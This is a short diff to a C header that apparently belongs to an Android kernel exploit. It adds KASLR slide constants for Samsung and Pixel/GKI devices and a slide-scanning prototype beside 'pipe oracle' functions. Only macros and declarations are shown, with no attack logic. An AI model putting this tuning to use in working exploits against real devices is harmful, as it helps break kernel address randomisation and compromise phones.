@@ -145,6 +145,16 @@
 #ifndef SLIDE_LOCK_OWNER_VALUE
 #define SLIDE_LOCK_OWNER_VALUE 0ULL
 #endif
+#ifndef P0_ALIAS_INCLUDES_SLIDE
+/* Default: the kernel image's physical load follows the VA slide
+ * (Samsung ABL). Pixel/GKI loads at a fixed phys, so targets override
+ * this to 0 and the linear-map alias is static. */
+#define P0_ALIAS_INCLUDES_SLIDE 1
+#endif
+#ifndef SLIDE_MAX_VA_SLIDE
+/* Samsung KASLR slides are 64KB-granular within the first 2MB. */
+#define SLIDE_MAX_VA_SLIDE 0x1f0000ULL
+#endif
 #ifndef LEGACY_RT_MUTEX_WAITER
 #define LEGACY_RT_MUTEX_WAITER 0
 #endif
@@ -423,6 +433,9 @@ int prepare_p0_pipe_oracle(void);
 int expand_p0_pipe_oracle(void);
 int verify_p0_pipe_oracle_gate(void);
 uintptr_t scan_p0_pipe_oracle(void);
+#if defined(P0_SLIDE_VIA_GLOBAL) && P0_SLIDE_VIA_GLOBAL
+uint64_t scan_p0_global_slide(void);
+#endif
 int restore_p0_oracle_pages(int fd);
 #endif
 
